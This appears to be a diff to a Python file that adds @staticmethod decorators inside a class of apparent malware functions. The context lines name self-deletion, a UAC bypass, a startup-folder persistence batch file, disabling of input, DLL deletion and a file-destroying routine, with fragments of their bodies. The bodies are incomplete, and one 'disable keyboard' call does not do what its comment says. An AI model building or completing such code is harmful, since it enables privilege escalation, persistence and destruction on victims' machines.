@@ -32,19 +32,23 @@ class Ptime():
     else:
       return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
 
+  @staticmethod
   def currentdate():
     return datetime.datetime.now().strftime("%Y-%m-%d") + "\n\n"
 
+  @staticmethod
   def currenttime():
     return datetime.datetime.now().strftime("%H:%M:%S") + "\n\n"
 
 
 class functions():
 
+  @staticmethod
   def seppuku():
     currentFile = str(os.getcwd() + "/main.py")
     os.remove(currentFile)
 
+  @staticmethod
   # TEST ON PC
   def minimize_current_window():
     try:
@@ -54,6 +58,7 @@ class functions():
     except:
       return False
 
+  @staticmethod
   # TEST ON VM
   def delete_dll():
     try:
@@ -82,6 +87,7 @@ class functions():
       with open(path_to_file, "wb") as binary_file:
         binary_file.write(data)
 
+  @staticmethod
   # TEST ON PC
   def disable_mouse_keyboard_windows():
     # Disable mouse
@@ -89,6 +95,7 @@ class functions():
     # Disable keyboard
     ctypes.windll.user32.DisableProcessWindowsGhosting()
 
+  @staticmethod
   # TEST ON PC
   def UAC_bypass():
     CMD = r"C:\Windows\System32\cmd.exe"
@@ -146,6 +153,7 @@ class functions():
   #except:
   #sys.exit(1)
 
+  @staticmethod
   # TEST ON PC
   def startup_surprise():
     with open(startupDir + '/windowsserver.bat', 'w') as fin:
@@ -166,6 +174,7 @@ Loop
       ''')
       Fin.close()
 
+  @staticmethod
   # TEST ON VM
   def file_fucker():
 
